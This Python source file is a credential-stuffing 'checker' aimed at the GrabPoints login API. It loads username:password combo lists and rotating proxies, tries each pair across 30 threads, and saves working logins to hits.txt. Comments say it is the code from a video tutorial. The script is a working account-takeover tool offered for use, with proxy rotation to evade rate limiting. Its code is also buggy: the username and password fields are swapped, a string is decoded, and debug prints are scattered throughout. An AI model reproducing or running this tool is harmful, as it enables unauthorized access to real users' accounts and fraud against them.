import requests
from colorama import Fore, init
from os import _exit
import ctypes
from multiprocessing.dummy import Pool
from multiprocessing import Lock
from random import choice
import json
 
init()
 
bad = 0
good = 0
loaded = 0
errors = 0
proxies = 0
checked = 0
 
lock = Lock()
 
class checker(object):
    def __init__(self, proxy_loaction,combo_location):
        self.proxy_l = proxy_loaction
        self.combo_l = combo_location
        self.combo_list = []
 
    def succes(self, user, passw, balance):
        global checked, good, loaded
        good += 1
        checked += 1
        lock.acquire()
        print("Login " + Fore.LIGHTGREEN_EX + "[Success] " + Fore.LIGHTWHITE_EX + f"Username {user} | Password {passw}")
        print(f"""
               UserName: {user}
               Password: {passw}
   ----------------------------------------------
           """, file=open("hits.txt", "a"))
        lock.release()
 
    def failed(self, user, passw):
        global checked, bad, loaded
        checked += 1
        bad += 1
        lock.acquire()
        print("Login " + Fore.LIGHTRED_EX + "[Failed] " + Fore.LIGHTWHITE_EX + f"Username {user} | Password {passw}")
        lock.release()
 
    def checker_main(self,email,password):
        global loaded, good, bad, checked, errors
        ctypes.windll.kernel32.SetConsoleTitleW(f" Checked: {checked}/{loaded} Bad: {bad} Good: {good} Error: {errors}")
        while True:
            try:
                try:
                    proxx = self.proxy_machine()
                    print(proxx)
                    post_context_data = {
                        "address": {},
                        "avatarURL": "/assets/i/avatar/default.png",
                        "newPassword": "",
                        "password": email,
                        "passwordVerification": "",
                        "state": "auth",
                        "userName": password,
                    }
 
                    headers_context_data = {
                        "content-type": "application/vnd-v4.0+json",
                        "x-device-os-id": "c75e4ff0-1836-4198-962f-6cff88c87f6d",
                        "accept-encoding": "gzip, deflate, br",
                        "accept": "application/json, text/plain, */*",
                    }
                    print("paso aki jeje ola")
                except:
                    print("aki ta el primer jeje ola")
                try:
                    try:
                        api_sender = requests.session()
                    except:
                        print("jeje ytu")
                    try:
                        json_content = api_sender.post("https://api.grabpoints.com/login", data=post_context_data,
                                                    headers=headers_context_data,proxies=proxx,timeout=7).text # you can change as you want the time out i mean!

                    except:
                        print("america jjaxd")
                    try:    
                        print(json_content)
                        decoded = json_content.decode()
                        print(decoded)
                        
                    except:
                        print("ya chingaste")
                except:
                    print("nmms ta aki wei jeje bruh")
                if """bad credentials""" in decoded:
                    self.failed(email,password)
                elif """principal""" in decoded:
                    self.succes(email,password,balance=False)
                else:
                    raise Exception
                break
            except:
                errors += 1
                print("ola ytu")
                break

 
    def combo_loader(self):
        print("si pues")
        try:
            _combo_ = open(self.combo_l, "r").readlines()
            _combo_fresh = [items.rstrip() for items in _combo_]
            print("pass4")
        except:
            print("heres the problem")
        try:
            for lines in _combo_fresh:
                print("passs")
                new_lines = lines.split(":")
                self.combo_list.append({"username": new_lines[0],
                                        "password": new_lines[1]})
        except:
            print("2")
 
    def proxy_machine(self):
        try:
           
            prox = open(self.proxy_l, "r").readlines()
            cleaned_prox = [items.rstrip() for items in prox]
            random_proxy = choice(cleaned_prox)
            return {
                "http": random_proxy,
                "https": random_proxy,
            }
            print(random_proxy)
        except:
            print("3")
    def sender(self, list_accounts):
        try:
            print("pass1")
            username = list_accounts["username"]
            password = list_accounts["password"]
            while True:
                try:
                    self.checker_main(username, password)
                    break
                except Exception:
                    pass
        except:
            print("4")
    def threads(self):
        try:
            print("pass2")
            self.combo_loader()
            self.threads = 30
            pool = Pool(self.threads)
            try:
                for _ in pool.imap_unordered(self.sender, self.combo_list):
                    pass
            except KeyboardInterrupt:
                _exit(0)
        except:
            print("5")
 
        print("Done!")
if __name__ == "__main__":
    print(Fore.LIGHTGREEN_EX+"""                                   __                  __            
 ________              .__        __          
/  _____/______   ____ |__| _____/  |_  ______
/   \ ___\____ \ /  _ \|  |/    \  __\/  ___/
\   \_\ \ |_> >  <_> )  |   |  \ |  \___ \
\______  /   __/ \____/|__|___|  /__| /____  >
       \/|__|                  \/          \/                                                          
   """)
    print(Fore.LIGHTCYAN_EX+"Private Checker -")
    print("")
    print("Please enter Key Below")
    while True:
        _key = input("Key: ")
        if _key == "":
            combo_name = "combo.txt"
            Proxy_name = "proxy.txt"
            print("oa")
            checker(Proxy_name,combo_name).threads()
            break
        else:
            print("Invalid Key.")
            continue
            # it have 5 secods time out you can change that later so guys that was all.
            # in next video i will show you coloring designing, title changing etc next week .
            # if you have any questions add me on steam and ask there or fb or just comment down !
            # on steam comment before adding me or i don't add :p and code in description sorry for not uploading for long time
            # bye guys :)
            # sorry about that :) !